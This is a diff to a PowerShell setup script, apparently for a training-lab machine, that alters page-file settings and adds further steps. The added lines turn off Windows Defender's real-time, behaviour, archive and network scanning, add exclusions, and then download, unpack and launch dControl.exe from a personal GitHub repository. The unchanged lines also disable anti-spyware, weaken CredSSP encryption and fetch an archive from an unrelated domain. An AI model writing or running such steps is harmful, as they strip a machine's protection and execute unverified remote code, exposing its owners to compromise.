@@ -5,6 +5,21 @@ $pagefileset = Get-WmiObject Win32_PageFileSetting
 $pagefileset.InitialSize = 90024
 $pagefileset.MaximumSize = 90048
 $pagefileset.Put() | Out-Null
+Add-MpPreference -ExclusionPath "C:\Program Files (x86)\DefenderControl\dControl.exe"
+Add-MpPreference -ExclusionPath "C:\Users\MS Learn Labs\Desktop\*"
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableScanningNetworkFiles $true
+Set-MpPreference -SubmitSamplesConsent 2
+$zipUrl = "https://raw.githubusercontent.com/user009dm/new/main/sordum.zip"
+
+# Define the path where the ZIP file will be saved
+$zipFilePath = "$env:USERPROFILE\Desktop\sordum.zip"
+$extractPath = "$env:USERPROFILE\Desktop"
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
+Start-Process -FilePath "$extractPath\dControl.exe"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\" -Name AllowEncryptionOracle -Value 2
 Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/Sandboxie-new.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip"
